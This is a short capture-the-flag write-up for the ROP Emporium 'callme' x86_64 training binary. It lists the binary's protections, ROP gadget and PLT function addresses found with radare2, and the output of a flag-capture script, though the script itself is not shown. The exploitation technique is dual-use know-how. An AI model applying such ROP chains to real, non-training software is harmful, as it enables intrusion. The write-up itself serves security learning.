# ROP Emporium - 03 callme x86_64

## ELF Binary Info
> $ `rabin2 -I ./callme`  
```
arch     x86
baddr    0x400000
binsz    6952
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    .
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Get ROP Gadgets
> $ `r2 -A ./callme`  
> [0x00400760]> `/R pop rdi`  
```
  0x0040093c                 5f  pop rdi
  0x0040093d                 5e  pop rsi
  0x0040093e                 5a  pop rdx
  0x0040093f                 c3  ret

  0x004009a3                 5f  pop rdi
  0x004009a4                 c3  ret
```

> [0x00400760]> `afl~callme`  
```
0x004006f0    1 6            sym.imp.callme_three
0x00400740    1 6            sym.imp.callme_two
0x00400720    1 6            sym.imp.callme_one
```

## Get Flag
> $ `python get_flag.py`  
```
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

